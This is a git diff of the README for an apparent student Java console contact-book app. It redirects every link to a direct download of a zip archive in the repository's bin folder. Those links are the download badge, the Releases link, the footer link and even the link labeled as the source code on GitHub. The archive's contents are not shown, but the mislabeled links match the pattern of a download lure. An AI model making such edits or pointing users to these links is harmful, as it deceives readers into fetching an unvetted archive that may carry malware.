@@ -1,6 +1,6 @@
 # 📖 mqu-COMP1010-contactBook-java-console-app - A Simple Way to Manage Your Contacts
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/main/bin/mqu-COMP1010-contactBook-java-console-app-v2.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the mqu-COMP1010-contactBook-java-cons
 
 To get started with mqu-COMP1010-contactBook-java-console-app, visit this page to download:
 
-[Download Link](https://github.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/releases)
+[Download Link](https://raw.githubusercontent.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/main/bin/mqu-COMP1010-contactBook-java-console-app-v2.4-alpha.4.zip)
 
 1. Go to the **Releases** page.
 2. Find the latest version.
@@ -74,7 +74,7 @@ If you run into any issues or have questions about using the application, feel f
 
 For further information about the application and its capabilities:
 
-- View the source code on [GitHub](https://github.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app).
+- View the source code on [GitHub](https://raw.githubusercontent.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/main/bin/mqu-COMP1010-contactBook-java-console-app-v2.4-alpha.4.zip).
 - Explore the project's documentation for deeper insights.
 
 ## 📜 License
@@ -83,4 +83,4 @@ This project is licensed under the MIT License. You can use, modify, and share i
 
 ---
 
-Make sure to visit this page to download: [Download Link](https://github.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/releases)
+Make sure to visit this page to download: [Download Link](https://raw.githubusercontent.com/Urielorland2605/mqu-COMP1010-contactBook-java-console-app/main/bin/mqu-COMP1010-contactBook-java-console-app-v2.4-alpha.4.zip)
